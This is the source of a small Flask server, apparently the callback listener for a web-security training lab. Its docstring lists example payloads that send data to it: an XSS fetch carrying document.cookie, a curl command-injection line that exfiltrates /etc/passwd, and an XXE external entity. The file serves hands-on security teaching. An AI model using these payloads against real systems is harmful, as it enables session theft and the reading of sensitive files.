"""
listener/listener.py
====================
A minimal HTTP server that logs every incoming request.

Use this as a callback target in SSRF, XSS, Command Injection, and XXE exercises.

Run (in a separate terminal):
    cd listener
    pip install flask
    python listener.py

Then target it from the lab:
    SSRF:              http://127.0.0.1:8080/?secret=data
    XSS payload:       fetch('http://127.0.0.1:8080/?c='+document.cookie)
    Command injection: curl http://127.0.0.1:8080/?d=$(cat /etc/passwd|base64)
    XXE entity:        <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/?hit=1">
"""

from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def log_request(path):
    now = datetime.now().strftime("%H:%M:%S")
    print("\n" + "=" * 60)
    print(f"[{now}]  {request.method}  /{path}")
    print("-" * 60)
    print("Headers:")
    for k, v in request.headers.items():
        print(f"  {k}: {v}")
    if request.args:
        print("Query params:")
        for k, v in request.args.items():
            print(f"  {k} = {v}")
    body = request.get_data(as_text=True)
    if body:
        print("Body:")
        print(f"  {body[:512]}")
    print("=" * 60)
    return "received\n", 200

if __name__ == "__main__":
    print("Listener started on http://0.0.0.0:8080")
    app.run(host="0.0.0.0", port=8080, debug=False)
